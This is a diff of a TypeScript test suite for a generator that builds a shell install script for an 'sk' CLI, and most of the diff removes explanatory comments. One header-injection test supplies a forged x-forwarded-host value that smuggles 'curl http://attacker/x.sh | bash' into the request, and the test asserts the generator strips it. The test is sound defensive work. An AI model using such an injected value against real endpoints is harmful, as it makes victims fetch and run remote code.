@@ -1,18 +1,3 @@
-// Install-script generator — pure-template tests.
-//
-// The /install endpoint produces a POSIX shell script the operator
-// pipes into bash. The script is generated per-request from the
-// engine's running version + the inferred public base URL. These
-// tests pin:
-//
-//   - The shebang and `set -euo pipefail` (script must abort on errors,
-//     not silently install half a binary).
-//   - Platform/arch detection covers darwin + linux × arm64 + x64.
-//   - The asset URL points at the GitHub Release for the current tag.
-//   - SHA256 verification refuses to install on mismatch.
-//   - The closing message includes the next-step `sk profile login`
-//     command with the engine URL pre-filled.
-
 import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { OpenAPIHono } from "@hono/zod-openapi";
 import { getConfig, setConfigKey } from "../../config/loader.ts";
@@ -47,9 +32,6 @@ describe("install script template", () => {
 
   test("probes the engine's bundled binary endpoint first", () => {
     const script = buildScript("3.4.0", "https://engine.example.com");
-    // The bundled URL must be probed (HEAD via curl -I) so operators with no
-    // outbound egress succeed. The check is a 5-second probe that 404s cleanly
-    // on the slim engine image.
     expect(script).toContain("BUNDLED_ASSET_URL=");
     // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variables in generated install script
     expect(script).toContain("/install/sk-${os}-${arch}");
@@ -58,9 +40,6 @@ describe("install script template", () => {
   });
 
   test("never points at the private source repository", () => {
-    // The repository is private, so a GitHub Releases fallback answers 404 for
-    // everyone outside it. It used to be the else branch here, and a newcomer
-    // on a slim image got an opaque curl failure with nothing to act on.
     const script = buildScript("3.4.0", "https://engine.example.com");
     expect(script).not.toContain("github.com");
     expect(script).not.toContain("releases/download");
@@ -71,7 +50,6 @@ describe("install script template", () => {
     // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variable in generated install script
     expect(script).toContain('MIRROR_BASE="${SK_INSTALL_BASE_URL:-}"');
     expect(script).toMatch(/elif \[ -n "\$MIRROR_BASE" \]; then/);
-    // A trailing slash on the operator's value must not produce a double slash.
     // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variables in generated install script
     expect(script).toContain("${MIRROR_BASE%/}/${ASSET}");
     // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variable in generated install script
@@ -80,8 +58,6 @@ describe("install script template", () => {
 
   test("with no bundle and no mirror it explains itself and installs nothing", () => {
     const script = buildScript("3.4.0", "https://engine.example.com");
-    // The failure a newcomer actually hits has to name the three ways forward,
-    // carry this engine's own URL, and say plainly that nothing was installed.
     expect(script).toContain("This engine does not serve the sk binaries");
     expect(script).toContain("https://engine.example.com/docker-compose.yml");
     expect(script).toContain("SK_INSTALL_BASE_URL=");
@@ -92,16 +68,7 @@ describe("install script template", () => {
   test("interpolates the engine base URL into the next-step message", () => {
     const script = buildScript("3.0.0", "https://my.engine.test");
     expect(script).toContain('ENGINE_URL="https://my.engine.test"');
-    // First-run path is `sk init`; already-bootstrapped engines use `sk
-    // login`. The legacy `sk profile login` was never an actual
-    // command — the CLI exposes `sk login` and `sk profile`
-    // (set/use/list/...), with no `login` subcommand under `profile`.
     expect(script).toContain("sk init --engine-url");
-    // sk init requires --token <token> (the one-time bootstrap token
-    // printed to engine stdout on first boot). Pin the placeholder so
-    // the install-script next-step instruction stays runnable —
-    // pre-fix it told operators "sk init --engine-url X" without the
-    // required arg, and they hit `sk init: --token <token> is required`.
     expect(script).toContain("--token <bootstrap-token>");
     expect(script).toContain("sk login --engine-url");
     expect(script).not.toContain("sk profile login");
@@ -136,12 +103,9 @@ describe("install script template", () => {
 
   test("installs to ~/.subkit/bin/sk by default, overridable via SK_INSTALL_DIR", () => {
     const script = buildScript("3.0.0", "https://engine.example.com");
-    // Strings deliberately use bash $-syntax. Built via String.fromCharCode
-    // so biome's noTemplateCurlyInString lint doesn't flag them — the
-    // characters are ${ }, the script content is unchanged.
-    const D = String.fromCharCode(36); // $
-    const L = String.fromCharCode(123); // {
-    const R = String.fromCharCode(125); // }
+    const D = String.fromCharCode(36);
+    const L = String.fromCharCode(123);
+    const R = String.fromCharCode(125);
     expect(script).toContain(
       `INSTALL_DIR="${D}${L}SK_INSTALL_DIR:-${D}${L}HOME${R}/.subkit/bin${R}"`,
     );
@@ -186,17 +150,6 @@ describe("sanitizeBaseUrl", () => {
 });
 
 describe("GET /install — header injection", () => {
-  // These tests are about the FALLBACK order, so they have to own the state
-  // that decides it. `/install` prefers a configured `server.public_base_url`
-  // over any forwarded header — deliberately, since an operator-set value is
-  // trusted and a header is not — and only falls through to the header when
-  // no value is configured.
-  //
-  // Left implicit, that precondition held by accident: run alone, the config
-  // loader was never initialised, so the fallback ran. Run inside the suite,
-  // an earlier file had loaded config and set a base URL, the configured value
-  // won, and both tests failed for a reason that had nothing to do with header
-  // handling. Setting it here makes the precondition the test's own.
   let priorBaseUrl: string | undefined;
 
   beforeAll(async () => {
@@ -204,8 +157,6 @@ describe("GET /install — header injection", () => {
       priorBaseUrl = getConfig().server.public_base_url ?? "";
       await setConfigKey("server.public_base_url", "", { force: true });
     } catch {
-      // Loader never initialised — the fallback path is already active and
-      // there is nothing to clear or restore.
       priorBaseUrl = undefined;
     }
   });
@@ -220,10 +171,8 @@ describe("GET /install — header injection", () => {
       "x-forwarded-host": 'evil.example.com"; curl http://attacker/x.sh | bash; echo "',
       "x-forwarded-proto": "https",
     });
-    // The malicious payload must not survive anywhere in the script.
     expect(script).not.toContain("attacker");
     expect(script).not.toContain("| bash; echo");
-    // ENGINE_URL falls back to the safe request origin, not the forged host.
     expect(script).toContain('ENGINE_URL="http://127.0.0.1"');
   });
 
